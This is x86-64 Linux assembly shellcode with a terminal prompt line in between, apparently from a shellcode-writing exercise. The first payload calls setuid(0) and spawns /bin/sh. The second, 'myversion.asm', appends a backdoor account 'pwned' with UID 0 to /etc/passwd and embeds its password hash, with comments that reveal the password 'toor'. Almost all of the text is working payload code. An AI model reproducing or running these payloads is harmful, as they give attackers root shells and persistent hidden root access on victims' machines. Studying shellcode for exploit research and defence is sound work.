global _start

section .text
_start:
    ; define __NR_setuid 105
    ; int setuid(uid_t uid);
    xor edi, edi 
    push 0x69
    pop rax 
    syscall 

    ; #define __NR_execve 59
    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    xor edx, edx
    push rdx
    mov rbx, 0x68732f2f6e69622f  ; /bin//sh 
    push rbx
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    lea rax, [rdx + 0x3b]
    syscall 

┌(epi@localhost)─(06:21 AM Sat Aug 11)
└─(sample-3)─> cat myversion.asm 
global _start

section .text
_start:
    ; #define __NR_open 2
    ; int open(const char *pathname, int flags);
    ; >>> os.O_WRONLY ^ os.O_APPEND 
    ; 1025
    ; rax -> 2 
    ; rdi -> /etc/passwd
    ; rsi -> 0x401
    xor eax, eax
    push rax 
    mov ebx, 0x647773ff             ; swd
    shr ebx, 0x08
    push rbx
    mov rbx, 0x7361702f6374652f     ; /etc/pas
    push rbx 
    mov rdi, rsp 
    xor esi, esi
    mov si, 0x401                   ; O_WRONLY|O_APPEND
    add al, 0x2
    syscall  

    ; #define __NR_write 1
    ; ssize_t write(int fd, const void *buf, size_t count);
    ; rax -> 1 
    ; rdi -> results of open syscall 
    ; rsi -> user's entry 
    ; rdx -> len of user's entry 
    xchg rdi, rax
    
    jmp short findaddress
    
_respawn:
    pop rsi
    push 0x1
    pop rax
    push 62
    pop rdx
    syscall

    ; #define __NR_close 3
    ; int close(int fd);
    ; rax -> 3
    ; rdi -> already contains /etc/passwd fd 
    push 0x3
    pop rax
    syscall                 

    ; #define __NR_exit 60
    ; void _exit(int status);
    ; rax -> 60 
    ; rdi -> don't care 
    push 60
    pop rax
    syscall 
    
findaddress:
    call _respawn
    string: db "pwned:$1$bUeq9i0X$U.pDViph7b.3zodHXOApV0:0:0::/root:/bin/bash",0xa
    ; openssl passwd -1 
    ; Password: toor
    ; Verifying - Password: toor
    ; $1$bUeq9i0X$U.pDViph7b.3zodHXOApV0

